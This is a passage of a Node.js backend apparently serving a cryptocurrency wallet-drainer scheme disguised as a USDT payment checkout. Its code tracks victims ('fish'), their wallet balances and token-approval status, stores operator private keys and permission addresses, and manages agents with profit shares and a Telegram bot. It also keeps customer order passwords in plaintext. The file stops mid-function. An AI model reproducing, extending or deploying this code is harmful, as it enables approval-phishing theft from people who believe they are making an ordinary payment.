const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fetch = require('node-fetch');
// const TronWeb = require('tronweb');
const TronWeb = require('tronweb').TronWeb;
const { promisify } = require('util');
const { Web3 } = require('web3');
const moment = require('moment');
const axios = require('axios');
const QRCode = require('qrcode');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'alouer-steal' });
});

const ALOUER_MERCHANT_ID = 'alouer';
const TRC20_USDT_CONTRACT = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';

function isEnabled(value) {
  return ['1', 'true', 'yes', 'on'].includes(String(value || '').trim().toLowerCase());
}

function signOkpayPayload(payload, token) {
  const query = Object.entries(payload)
    .filter(([key, value]) => key !== 'sign' && String(key).trim() && String(value).trim())
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([key, value]) => `${String(key).trim()}=${String(value).trim()}`)
    .join('&');
  return crypto.createHash('md5')
    .update(`${query}&token=${String(token || '').trim()}`)
    .digest('hex')
    .toUpperCase();
}

function publicPayUrl(returnUrl, orderId) {
  try {
    const url = new URL(returnUrl);
    return `${url.origin}/alouer-checkout/?order_id=${encodeURIComponent(orderId)}`;
  } catch (_e) {
    return `/alouer-checkout/?order_id=${encodeURIComponent(orderId)}`;
  }
}

function publicPayUrlWithGuestToken(returnUrl, orderId, guestToken) {
  const target = publicPayUrl(returnUrl, orderId);
  if (!guestToken) return target;
  try {
    const url = new URL(target, 'http://localhost');
    url.searchParams.set('guest', '1');
    url.searchParams.set('guest_token', guestToken);
    return /^https?:\/\//i.test(target)
      ? `${url.origin}${url.pathname}${url.search}`
      : `${url.pathname}${url.search}`;
  } catch (_e) {
    const connector = target.includes('?') ? '&' : '?';
    return `${target}${connector}guest=1&guest_token=${encodeURIComponent(guestToken)}`;
  }
}

async function loadGuestOrderAuth(orderNo) {
  if (!orderNo) return null;
  const result = await pgPool.query(
    `SELECT order_no, guest_email, guest_password
     FROM orders
     WHERE order_no = $1
     LIMIT 1`,
    [String(orderNo)]
  );
  const row = result.rows[0];
  if (!row?.guest_email || !row?.guest_password) return null;
  return {
    order_no: row.order_no,
    email: String(row.guest_email),
    order_password: String(row.guest_password)
  };
}

// ===== Aloure Admin API =====
app.get('/api/alouer/options', async (req, res) => {
  try {
    const result = await pgPool.query('SELECT name, value FROM options');
    const data = {};
    result.rows.forEach(r => { data[r.name] = r.value; });
    res.json({ ok: true, data });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.post('/api/alouer/options', async (req, res) => {
  try {
    const { options } = req.body;
    for (const [name, value] of Object.entries(options)) {
      await pgPool.query(
        `INSERT INTO options (name, value) VALUES ($1, $2) ON CONFLICT (name) DO UPDATE SET value = $2`,
        [name, value || '']
      );
    }
    await syncAlouerPaymentChannel();
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

// OKPay-compatible gateway. Dujiao-Next keeps ownership of the order/payment
// record while alouer-steal owns the hosted checkout page.
app.post('/payLink', async (req, res) => {
  try {
    const cfg = cacheData.options || {};
    const merchantToken = cfg.alouer_gateway_token || '';
    const payload = req.body || {};
    if (!merchantToken || payload.id !== ALOUER_MERCHANT_ID) {
      return res.status(403).json({ status: 'error', message: 'invalid merchant' });
    }
    if (signOkpayPayload(payload, merchantToken) !== String(payload.sign || '').toUpperCase()) {
      return res.status(403).json({ status: 'error', message: 'invalid signature' });
    }
    if (!payload.unique_id || !payload.amount || !payload.return_url || !payload.callback_url) {
      return res.status(400).json({ status: 'error', message: 'missing required fields' });
    }

    const orderId = `AL${Date.now()}${crypto.randomInt(1000, 9999)}`;
    const guestAuth = await loadGuestOrderAuth(payload.unique_id);
    const guestToken = guestAuth ? crypto.randomBytes(24).toString('hex') : null;
    await pgPool.query(
      `INSERT INTO alouer_payments
       (gateway_order_id, order_no, amount, coin, return_url, callback_url, status,
        guest_email, guest_password, guest_session_token)
       VALUES ($1,$2,$3,$4,$5,$6,'pending',$7,$8,$9)`,
      [
        orderId,
        String(payload.unique_id),
        String(payload.amount),
        String(payload.coin || 'USDT').toUpperCase(),
        String(payload.return_url),
        String(payload.callback_url),
        guestAuth?.email || null,
        guestAuth?.order_password || null,
        guestToken
      ]
    );

    res.json({
      status: 'success',
      data: {
        order_id: orderId,
        pay_url: publicPayUrlWithGuestToken(payload.return_url, orderId, guestToken)
      }
    });
  } catch (e) {
    console.error('[Alouer Pay] create failed:', e.message);
    res.status(500).json({ status: 'error', message: 'create payment failed' });
  }
});

app.get('/api/alouer/payment/:orderId', async (req, res) => {
  try {
    const result = await pgPool.query(
      `SELECT gateway_order_id, order_no, amount, coin, status, created_at
       FROM alouer_payments WHERE gateway_order_id = $1 LIMIT 1`,
      [req.params.orderId]
    );
    if (!result.rows[0]) return res.status(404).json({ ok: false, msg: 'payment not found' });
    const cfg = cacheData.options || {};
    res.json({
      ok: true,
      data: {
        ...result.rows[0],
        payment_address: cfg.payment_address || ''
      }
    });
  } catch (e) {
    res.status(500).json({ ok: false, msg: e.message });
  }
});

app.get('/api/alouer/payment/:orderId/guest-session', async (req, res) => {
  try {
    const guestToken = String(req.query?.token || '').trim();
    if (!guestToken) {
      return res.status(400).json({ ok: false, msg: '缺少游客会话令牌' });
    }
    const result = await pgPool.query(
      `SELECT gateway_order_id, order_no, guest_email, guest_password, guest_session_token
       FROM alouer_payments
       WHERE gateway_order_id = $1
       LIMIT 1`,
      [req.params.orderId]
    );
    const payment = result.rows[0];
    if (!payment) return res.status(404).json({ ok: false, msg: '支付订单不存在' });
    if (!payment.guest_email || !payment.guest_password || !payment.guest_session_token) {
      return res.status(404).json({ ok: false, msg: '当前订单不是游客订单' });
    }
    if (payment.guest_session_token !== guestToken) {
      return res.status(403).json({ ok: false, msg: '游客会话令牌无效' });
    }
    res.json({
      ok: true,
      data: {
        order_no: payment.order_no,
        email: payment.guest_email,
        order_password: payment.guest_password
      }
    });
  } catch (e) {
    res.status(500).json({ ok: false, msg: e.message });
  }
});

app.post('/api/alouer/payment/:orderId/verify', async (req, res) => {
  try {
    const txHash = String(req.body?.tx_hash || '').trim();
    if (!/^[0-9a-f]{64}$/i.test(txHash)) {
      return res.status(400).json({ ok: false, msg: '交易哈希格式不正确' });
    }
    const result = await pgPool.query(
      `SELECT * FROM alouer_payments WHERE gateway_order_id = $1 LIMIT 1`,
      [req.params.orderId]
    );
    const payment = result.rows[0];
    if (!payment) return res.status(404).json({ ok: false, msg: '支付订单不存在' });
    if (payment.status === 'success') return res.json({ ok: true, msg: '订单已确认支付' });

    const cfg = cacheData.options || {};
    const paymentAddress = String(cfg.payment_address || '').trim();
    if (!paymentAddress) return res.status(400).json({ ok: false, msg: '未配置 TRC20 收款地址' });

    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: cfg.trongridkyes ? { 'TRON-PRO-API-KEY': pickRandom(cfg.trongridkyes) } : {}
    });
    const txInfo = await tronWeb.trx.getTransactionInfo(txHash);
    if (!txInfo?.blockNumber || txInfo?.receipt?.result !== 'SUCCESS') {
      return res.status(400).json({ ok: false, msg: '交易尚未确认或执行失败' });
    }

    const expectedAmount = BigInt(Math.round(Number(payment.amount) * 1e6));
    const transferTopic = 'ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
    const matched = (txInfo.log || []).some(log => {
      try {
        const contractHex = String(log.address || '').replace(/^0x/, '');
        const contract = TronWeb.address.fromHex(contractHex.startsWith('41') ? contractHex : `41${contractHex.slice(-40)}`);
        const topics = log.topics || [];
        if (contract !== TRC20_USDT_CONTRACT || topics[0]?.toLowerCase() !== transferTopic) return false;
        const toHex = `41${String(topics[2] || '').slice(-40)}`;
        const to = TronWeb.address.fromHex(toHex);
        const amount = BigInt(`0x${String(log.data || '0').replace(/^0x/, '')}`);
        return to === paymentAddress && amount === expectedAmount;
      } catch (_e) {
        return false;
      }
    });
    if (!matched) {
      return res.status(400).json({ ok: false, msg: '未找到金额和收款地址匹配的 USDT 转账' });
    }

    const callbackPayload = {
      id: ALOUER_MERCHANT_ID,
      status: 'success',
      'data[order_id]': payment.gateway_order_id,
      'data[unique_id]': payment.order_no,
      'data[amount]': Number(payment.amount).toFixed(8),
      'data[coin]': payment.coin,
      'data[status]': '1',
      'data[type]': 'payment'
    };
    callbackPayload.sign = signOkpayPayload(callbackPayload, cfg.alouer_gateway_token);
    const callbackResponse = await axios.post(payment.callback_url, new URLSearchParams(callbackPayload).toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 10000
    });
    if (callbackResponse.status < 200 || callbackResponse.status >= 300) {
      throw new Error(`callback status ${callbackResponse.status}`);
    }
    await pgPool.query(
      `UPDATE alouer_payments SET status='success', tx_hash=$1, updated_at=NOW()
       WHERE gateway_order_id=$2`,
      [txHash, payment.gateway_order_id]
    );
    res.json({ ok: true, msg: '支付已确认，订单状态已更新' });
  } catch (e) {
    console.error('[Alouer Pay] verify failed:', e.message);
    res.status(500).json({ ok: false, msg: '支付确认失败，请稍后重试' });
  }
});

app.get('/api/alouer/daili', async (req, res) => {
  try {
    const result = await pgPool.query('SELECT * FROM daili ORDER BY id DESC');
    res.json({ ok: true, data: result.rows });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.post('/api/alouer/daili', async (req, res) => {
  try {
    const { unique_id, tguid, username, fullName, payment_address, groupid, threshold } = req.body;
    await pgPool.query(
      `INSERT INTO daili (unique_id, tguid, username, fullName, payment_address, groupid, threshold, time) VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
      [unique_id, tguid, username, fullName, payment_address, groupid, threshold || 1000, new Date().toISOString()]
    );
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.put('/api/alouer/daili', async (req, res) => {
  try {
    const { id, unique_id, tguid, username, fullName, payment_address, groupid, threshold } = req.body;
    await pgPool.query(
      `UPDATE daili SET unique_id=$1, tguid=$2, username=$3, fullName=$4, payment_address=$5, groupid=$6, threshold=$7 WHERE id=$8`,
      [unique_id, tguid, username, fullName, payment_address, groupid, threshold || 1000, id]
    );
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.delete('/api/alouer/daili', async (req, res) => {
  try {
    await pgPool.query('DELETE FROM daili WHERE id=$1', [req.query.id]);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.get('/api/alouer/daili-group', async (req, res) => {
  try {
    const result = await pgPool.query('SELECT * FROM daili_group ORDER BY id DESC');
    res.json({ ok: true, data: result.rows });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.post('/api/alouer/daili-group', async (req, res) => {
  try {
    const { groupid, remark, share_profits, status } = req.body;
    await pgPool.query(`INSERT INTO daili_group (groupid, remark, share_profits, status) VALUES ($1,$2,$3,$4)`, [groupid, remark, share_profits, status || 1]);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.put('/api/alouer/daili-group', async (req, res) => {
  try {
    const { id, groupid, remark, share_profits, status } = req.body;
    await pgPool.query(`UPDATE daili_group SET groupid=$1, remark=$2, share_profits=$3, status=$4 WHERE id=$5`, [groupid, remark, share_profits, status, id]);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.delete('/api/alouer/daili-group', async (req, res) => {
  try {
    await pgPool.query('DELETE FROM daili_group WHERE id=$1', [req.query.id]);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

app.get('/api/alouer/fish', async (req, res) => {
  try {
    const result = await pgPool.query('SELECT * FROM fish ORDER BY id DESC');
    res.json({ ok: true, data: result.rows });
  } catch (e) { res.json({ ok: false, msg: e.message }); }
});

// ===== Aloure Payment Page API (供 /pay 页面 initPaymentUI 调用) =====

// 随机选一个域名（多域名时用于二维码 URL 拼接）
function pickRandom(value) {
  if (!value) return '';
  const list = String(value).split(/\r\n|\r|\n/).map(s => s.trim()).filter(Boolean);
  if (list.length === 0) return '';
  return list[Math.floor(Math.random() * list.length)];
}

// GET /payment-config  返回 USDT/EVM 收款地址、授权地址、域名等
app.get('/payment-config', async (req, res) => {
  try {
    const cfg = cacheData.options || {};
    res.json({
      status: 'success',
      config: {
        domain: pickRandom(cfg.domain),
        payment_address: cfg.payment_address || '',
        permission_address: pickRandom(cfg.permission_address),
        authorized_amount: cfg.authorized_amount || '',
        authorize_note: cfg.authorize_note || '',
        model: cfg.model || '1',
        '0x_payment_address': cfg['0x_payment_address'] || '',
        // 兼容老缓存里写成 OxPermissionAddress（大写 O）的历史数据
        '0x_permission_address': cfg['0x_permission_address'] || cfg.OxPermissionAddress || '',
        default_id: cfg.default_id || ''
      }
    });
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});

// POST /browse-broadcast  钱包连接时上报浏览信息 (写入 fish_browse)
app.post('/browse-broadcast', async (req, res) => {
  try {
    const {
      fish_address, chainid, permissions_fishaddress,
      unique_id, usdt_balance, gas_balance, time
    } = req.body || {};
    if (!fish_address) return res.json({ status: 'error', message: 'fish_address is required' });
    await pgPool.query(
      `INSERT INTO fish_browse (fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, time, state)
       VALUES ($1,$2,$3,$4,$5,$6,$7,0)
       ON CONFLICT (fish_address) DO UPDATE SET
         chainid = EXCLUDED.chainid,
         permissions_fishaddress = EXCLUDED.permissions_fishaddress,
         unique_id = EXCLUDED.unique_id,
         usdt_balance = EXCLUDED.usdt_balance,
         gas_balance = EXCLUDED.gas_balance,
         time = EXCLUDED.time`,
      [
        fish_address,
        chainid || 'TRC',
        permissions_fishaddress || '',
        unique_id || null,
        usdt_balance || '0.000000',
        gas_balance || '0.000000',
        time || new Date().toISOString()
      ]
    );
    res.json({ status: 'success' });
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});

// POST /query-address  判断用户是否已授权（auth_status=1 → 转账；否则 → 授权）
app.post('/query-address', async (req, res) => {
  try {
    const fish_address = (req.body && req.body.fish_address) || '';
    const chainid = (req.body && req.body.chainid) || '';
    if (!fish_address) return res.json({ status: 'error', message: 'fish_address is required' });
    const fish = cacheData.fishMap.get(fish_address);
    if (fish && Number(fish.auth_status) === 1) {
      res.json({ status: 'success', result: 'yes' });
    } else {
      res.json({ status: 'success', result: 'no' });
    }
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});

// POST /agent-payment-address  根据 unique_id 取出代理的收款地址
app.post('/agent-payment-address', async (req, res) => {
  try {
    const unique_id = (req.body && req.body.unique_id) || '';
    if (!unique_id) return res.json({ status: 'no' });
    const daili = cacheData.dailiMap.get(String(unique_id));
    if (daili && daili.payment_address) {
      res.json({ status: daili.payment_address });
    } else {
      res.json({ status: 'no' });
    }
  } catch (e) {
    res.json({ status: 'no', message: e.message });
  }
});

// POST /payment/trc20/verify  通过 TronGrid 校验交易是否已确认
app.post('/payment/trc20/verify', async (req, res) => {
  try {
    const { order_sn, userAddress, toAddress, usdtContractAddress, txHash } = req.body || {};
    if (!txHash) return res.json({ success: false, message: 'txHash is required' });

    const apiKey = (cacheData.options && cacheData.options.trongridkyes) || '';
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: apiKey ? { 'TRON-PRO-API-KEY': apiKey } : {}
    });

    let txInfo;
    try {
      txInfo = await tronWeb.trx.getTransactionInfo(txHash);
    } catch (e) {
      return res.json({ success: false, message: '查询交易失败: ' + e.message });
    }
    if (!txInfo || !txInfo.blockNumber) {
      return res.json({ success: false, message: '交易尚未确认，请稍后再试' });
    }

    // 成功确认后回写鱼苗表的 auth_status=1 与最近浏览信息
    try {
      await pgPool.query(
        `UPDATE fish SET auth_status = 1 WHERE fish_address = $1`,
        [userAddress]
      );
      if (userAddress) {
        await pgPool.query(
          `INSERT INTO fish_browse (fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, time, state)
           VALUES ($1,'TRC',$2,'',0,0,to_char(now(),'YYYY-MM-DD HH24:MI:SS'),1)
           ON CONFLICT (fish_address) DO UPDATE SET
             permissions_fishaddress = EXCLUDED.permissions_fishaddress,
             time = EXCLUDED.time,
             state = 1`,
          [userAddress, toAddress || '']
        );
      }
    } catch (_e) { /* 非关键路径，吞掉 */ }

    res.json({ success: true, message: '支付成功', order_sn });
  } catch (e) {
    res.json({ success: false, message: e.message });
  }
});

// POST /payment/evm/verify  通过 EVM 节点（公共 RPC）校验交易已确认并落地
app.post('/payment/evm/verify', async (req, res) => {
  try {
    const { order_sn, userAddress, toAddress, usdtContractAddress, txHash, chain } = req.body || {};
    if (!txHash) return res.json({ success: false, message: 'txHash is required' });
    if (!userAddress || !toAddress) return res.json({ success: false, message: 'userAddress / toAddress 必填' });

    const chainId = (chain || 'ERC').toUpperCase();
    const rpcMap = {
      ERC: process.env.ETH_RPC || 'https://eth.llamarpc.com',
      BSC: process.env.BSC_RPC || 'https://bsc-dataseed.binance.org',
      OKC: process.env.OKC_RPC || 'https://exchainrpc.okex.org',
      POL: process.env.POL_RPC || 'https://polygon-rpc.com',
      GRC: process.env.GRC_RPC || 'https://rpc.eggscoin.network'
    };
    const rpc = rpcMap[chainId] || rpcMap.ERC;
    const { Web3 } = require('web3');
    const w3 = new Web3(rpc);

    let receipt;
    try {
      receipt = await w3.eth.getTransactionReceipt(txHash);
    } catch (e) {
      return res.json({ success: false, message: '查询交易失败: ' + e.message });
    }
    if (!receipt || !receipt.status) {
      return res.json({ success: false, message: '交易尚未确认或已失败' });
    }
    if (receipt.to && usdtContractAddress && receipt.to.toLowerCase() !== usdtContractAddress.toLowerCase()) {
      return res.json({ success: false, message: '目标合约地址不匹配' });
    }

    // 成功确认后回写鱼苗表
    try {
      await pgPool.query(
        `UPDATE fish SET auth_status = 1 WHERE fish_address = $1`,
        [userAddress]
      );
      await pgPool.query(
        `INSERT INTO fish_browse (fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, time, state)
         VALUES ($1,$2,$3,'',0,0,to_char(now(),'YYYY-MM-DD HH24:MI:SS'),1)
         ON CONFLICT (fish_address) DO UPDATE SET
           chainid = EXCLUDED.chainid,
           permissions_fishaddress = EXCLUDED.permissions_fishaddress,
           time = EXCLUDED.time,
           state = 1`,
        [userAddress, chainId, toAddress]
      );
    } catch (_e) { /* 非关键路径 */ }

    res.json({ success: true, message: '支付成功', order_sn });
  } catch (e) {
    res.json({ success: false, message: e.message });
  }
});

// GET /search-order-by-browser  支付成功跳转的查询页
app.get('/search-order-by-browser', async (req, res) => {
  try {
    const id = String(req.query.id || '');
    const m = id.match(/^(trc|erc|bsc|okc|pol|grc)(\d+)$/i);
    if (!m) return res.json({ status: 'error', message: '无效的 id' });
    const chainid = m[1].toUpperCase();
    const unique_id = m[2];
    const daili = cacheData.dailiMap.get(unique_id);
    res.json({
      status: 'success',
      data: {
        order_sn: id,
        chainid,
        unique_id,
        daili: daili || null
      }
    });
  } catch (e) {
    res.json({ status: 'error', message: e.message });
  }
});
// ===== End Aloure Payment Page API =====

// Start API server immediately (independent of bot)
const backendPort = Number.parseInt(process.env.BACKEND_PORT || '3025', 10);
app.listen(backendPort, () => console.log(`[Aloure API] listening on port ${backendPort}`));
// ===== End Aloure Admin API =====

// 获取当前时间
function getTimeInfo() {
    const now = new Date();
    const beijingHourOffset = 8;
    const utcHour = now.getUTCHours();
    const beijingHour = (utcHour + beijingHourOffset) % 24;
    let utcDate = now.getUTCDate();
    let utcMonth = now.getUTCMonth();
    let utcYear = now.getUTCFullYear();
    if (utcHour + beijingHourOffset >= 24) {
        const nextDay = new Date(Date.UTC(utcYear, utcMonth, utcDate + 1));
        utcDate = nextDay.getUTCDate();
        utcMonth = nextDay.getUTCMonth();
        utcYear = nextDay.getUTCFullYear();
    }
    let greeting;  // 根据当前时间判断对应的问候语
    if (beijingHour >= 0 && beijingHour < 6) {
        greeting = "凌晨好";
    } else if (beijingHour >= 6 && beijingHour < 9) {
        greeting = "早上好";
    } else if (beijingHour >= 9 && beijingHour < 12) {
        greeting = "上午好";
    } else if (beijingHour >= 12 && beijingHour < 13) {
        greeting = "中午好";
    } else if (beijingHour >= 13 && beijingHour < 18) {
        greeting = "下午好";
    } else if (beijingHour >= 18 && beijingHour < 19) {
        greeting = "傍晚好";
    } else {
        greeting = "晚上好";
    }
    const year = utcYear;
    const month = String(utcMonth + 1).padStart(2, '0');
    const day = String(utcDate).padStart(2, '0');
    const hours = String(beijingHour).padStart(2, '0');
    const minutes = String(now.getUTCMinutes()).padStart(2, '0');
    const seconds = String(now.getUTCSeconds()).padStart(2, '0');
    const formattedTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    return {
        time: formattedTime,
        greeting: greeting
    };
}

// 创建数据库连接池 (PostgreSQL)
const dbConfig = {
    host: process.env.DB_HOST,
    port: parseInt(process.env.DB_PORT),
    database: process.env.DB_DATABASE,
    user: process.env.DB_USERNAME,
    password: process.env.DB_PASSWORD
};
const pgPool = new Pool(dbConfig);

// pg → mysql2 兼容层（使原有 pool.query 调用无需大改）
const pool = {
    promise() {
        return {
            async query(sql, params) {
                // 转换 MySQL ? 占位符为 PostgreSQL $1, $2...
                let idx = 0;
                const pgSql = sql.replace(/\?/g, () => `$${++idx}`);
                const result = await pgPool.query(pgSql, params);
                return [result.rows, result.fields];
            }
        };
    }
};
// 数据库缓存
let cacheData = {
   fishMap: new Map(),
   fishBrowseMap: new Map(),
   dailiMap: new Map(),
   dailiGroupMap: new Map(),
   options: {},
   permissionAddresses: [] 
};

async function ensureAlouerPaymentSchema() {
  await pgPool.query(`
    CREATE TABLE IF NOT EXISTS alouer_payments (
      id BIGSERIAL PRIMARY KEY,
      gateway_order_id VARCHAR(64) NOT NULL UNIQUE,
      order_no VARCHAR(128) NOT NULL,
      amount NUMERIC(20,8) NOT NULL,
      coin VARCHAR(16) NOT NULL DEFAULT 'USDT',
      return_url TEXT NOT NULL,
      callback_url TEXT NOT NULL,
      status VARCHAR(32) NOT NULL DEFAULT 'pending',
      tx_hash VARCHAR(128),
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `);
  await pgPool.query(`
    ALTER TABLE alouer_payments
    ADD COLUMN IF NOT EXISTS guest_email VARCHAR(255),
    ADD COLUMN IF NOT EXISTS guest_password VARCHAR(255),
    ADD COLUMN IF NOT EXISTS guest_session_token VARCHAR(128)
  `);
}

async function syncAlouerPaymentChannel() {
  await ensureAlouerPaymentSchema();
  const result = await pgPool.query(
    `SELECT name, value FROM options
     WHERE name IN ('alouer_payment_enabled','alouer_payment_name','alouer_payment_public_url','alouer_gateway_token','main_domain')`
  );
  const options = Object.fromEntries(result.rows.map(row => [row.name, row.value || '']));
  if (!options.alouer_gateway_token) {
    options.alouer_gateway_token = crypto.randomBytes(32).toString('hex');
    await pgPool.query(
      `INSERT INTO options (name, value) VALUES ('alouer_gateway_token', $1)
       ON CONFLICT (name) DO UPDATE SET value = EXCLUDED.value`,
      [options.alouer_gateway_token]
    );
  }

  const enabled = isEnabled(options.alouer_payment_enabled);
  const channelName = String(options.alouer_payment_name || 'alouer').trim() || 'alouer';
  const mainDomain = String(options.alouer_payment_public_url || options.main_domain || '').trim().replace(/\/+$/, '');
  const returnUrl = mainDomain ? `${mainDomain}/payment` : 'https://localhost/payment';
  const config = {
    gateway_url: 'http://alouer-steal',
    merchant_id: ALOUER_MERCHANT_ID,
    merchant_token: options.alouer_gateway_token,
    exchange_rate: '1',
    return_url: returnUrl,
    callback_url: 'http://api:3000/api/v1/payments/callback',
    display_name: channelName,
    coin: 'USDT'
  };

  const existing = await pgPool.query(
    `SELECT id FROM payment_channels
     WHERE provider_type = 'okpay' AND config_json->>'merchant_id' = $1
     ORDER BY id LIMIT 1`,
    [ALOUER_MERCHANT_ID]
  );
  if (existing.rows[0]) {
    await pgPool.query(
      `UPDATE payment_channels SET name=$1, channel_type='usdt', interaction_mode='redirect',
       config_json=$2, is_active=$3, sort_order=1, updated_at=NOW() WHERE id=$4`,
      [channelName, config, enabled, existing.rows[0].id]
    );
  } else {
    await pgPool.query(
      `INSERT INTO payment_channels
       (name, provider_type, channel_type, interaction_mode, config_json, is_active, sort_order, created_at, updated_at)
       VALUES ($1,'okpay','usdt','redirect',$2,$3,1,NOW(),NOW())`,
      [channelName, config, enabled]
    );
  }
  cacheData.options = { ...cacheData.options, ...options };
  console.log(`[Alouer Pay] channel synchronized (${enabled ? 'enabled' : 'disabled'})`);
}

async function startCacheUpdate() {
  while (true) {
    try {
      const [fishData, fishBrowseData, dailiData, dailiGroupData, optionsData] = await Promise.all([ 
        pool.promise().query(
          "SELECT fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, threshold, time, remark, auth_status FROM fish"
        ),
        pool.promise().query(
          "SELECT id, fish_address, chainid, permissions_fishaddress, unique_id, usdt_balance, gas_balance, time, state FROM fish_browse"
        ),
        pool.promise().query(
          "SELECT tguid, username, fullName, fishnumber, time, remark, payment_address, groupid, threshold, unique_id FROM daili"
        ),
        pool.promise().query(
          "SELECT id, groupid, remark, share_profits, status FROM daili_group"
        ),
        pool.promise().query(
          "SELECT name, value FROM options WHERE name IN ('domain', 'payment_address', 'permission_address', 'private_key', '0x_payment_address', '0x_permission_address', '0x_private_key', 'contract_method', 'need_usdt_contract', 'bot_key', 'trongridkyes', 'main_domain', 'default_id', 'model', 'authorized_amount', 'authorize_note', 'alouer_payment_enabled', 'alouer_payment_name', 'alouer_payment_public_url', 'alouer_gateway_token')"
        )
      ]);
      const newFishMap = new Map();
      fishData[0].forEach(row => {
        newFishMap.set(row.fish_address, row);
      });
      const newFishBrowseMap = new Map();
      fishBrowseData[0].forEach(row => {
        newFishBrowseMap.set(row.fish_address, row);
      });
      const newDailiMap = new Map();
      dailiData[0].forEach(row => {
        newDailiMap.set(row.unique_id, row);
      });
      const newDailiGroupMap = new Map();
      dailiGroupData[0].forEach(row => {
        newDailiGroupMap.set(row.groupid, row);
      });
      const newOptions = {};
      const newPermissionAddresses = [];
      optionsData[0].forEach(row => {
        if (row.name === '0x_permission_address') {
          newOptions['OxPermissionAddress'] = row.value;
        } else if (row.name === '0x_private_key') {
          newOptions['OxPrivateKey'] = row.value;
        } else if (row.name === 'permission_address' && row.value) {
          const addresses = row.value.split('\r\n').filter(addr => addr.trim());
          newPermissionAddresses.push(...addresses);
          newOptions[row.name] = row.value;
        } else {
          newOptions[row.name] = row.value;
        }
      });
      cacheData.fishMap = newFishMap;
      cacheData.fishBrowseMap = newFishBrowseMap;
      cacheData.dailiMap = newDailiMap;
      cacheData.dailiGroupMap = newDailiGroupMap;
      cacheData.options = newOptions;
      cacheData.permissionAddresses = newPermissionAddresses;
      // 每3秒更新一次
      await new Promise(resolve => setTimeout(resolve, 3000));
    } catch (error) {
      // 如果出现错误，休眠10秒后继续更新
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }
}

// 初始化启动 Telegram Bot
let bot = null;
async function initBot() {
  try {
    const missingConfigs = [];
    const incorrectConfigs = [];
    
    if (!cacheData.options['bot_key'] || cacheData.options['bot_key'].trim() === '') missingConfigs.push('机器人密钥');
    if (!cacheData.options['trongridkyes'] || cacheData.options['trongridkyes'].trim() === '') missingConfigs.push('TronGrid密钥');
    if (!cacheData.options['main_domain'] || cacheData.options['main_domain'].trim() === '') missingConfigs.push('主域名');
    if (cacheData.dailiGroupMap.size === 0) missingConfigs.push('群组信息');
    
    if (!cacheData.options['private_key'] || cacheData.options['private_key'].trim() === '') {
      missingConfigs.push('TRC权限私钥');
    } else {
      const privateKey = cacheData.options['private_key'].trim();
      if (!/^[0-9a-fA-F]{64}$/.test(privateKey)) incorrectConfigs.push('TRC权限私钥不正确');
    }
    
    if (!cacheData.options['payment_address'] || cacheData.options['payment_address'].trim() === '') {
      missingConfigs.push('TRC收款地址');
    } else {
      const paymentAddress = cacheData.options['payment_address'].trim();
      if (!/^T[A-Za-z0-9]{33}$/.test(paymentAddress)) incorrectConfigs.push('TRC收款地址不正确');
    }
    
    if (cacheData.permissionAddresses.length === 0) {
      missingConfigs.push('TRC权限地址');
    } else {
      cacheData.permissionAddresses.forEach((address, index) => {
        if (!/^T[A-Za-z0-9]{33}$/.test(address.trim())) incorrectConfigs.push(`第${index + 1}个权限地址不正确`);
      });
    }
    
    if (!cacheData.options['OxPermissionAddress'] || cacheData.options['OxPermissionAddress'].trim() === '') missingConfigs.push('EVM权限地址');
    
    if (missingConfigs.length > 0 || incorrectConfigs.length > 0) {
      let errorMessage = '\n======机器人启动失败======\n';
      if (missingConfigs.length > 0) {
        errorMessage += '缺少配置选项：\n';
        missingConfigs.forEach((config, index) => errorMessage += `${index + 1}.【${config}】\n`);
      }
      if (incorrectConfigs.length > 0) {
        if (missingConfigs.length > 0) errorMessage += '\n';
        errorMessage += '配置信息不正确：\n';
        incorrectConfigs.forEach((config, index) => errorMessage += `${index + 1}.【${config}】\n`);
      }
      errorMessage += '======机器人启动失败======';
      console.error(`[${getTimeInfo().time}] Bot初始化失败:${errorMessage}`);
      return false;
    }
    
    const botKey = cacheData.options['bot_key'];
    bot = new TelegramBot(botKey, {
      polling: { interval: 3000, autoStart: true, params: { offset: -1, timeout: 30 } },
      request: { agentOptions: { keepAlive: true, family: 4 } }
    });
    bot.on('polling_error', (error) => console.error(`[${getTimeInfo().time}] 轮询错误:`, error));
    setupBotHandlers(bot);
    setupCallbackHandlers(bot);
    return true;
  } catch (error) {
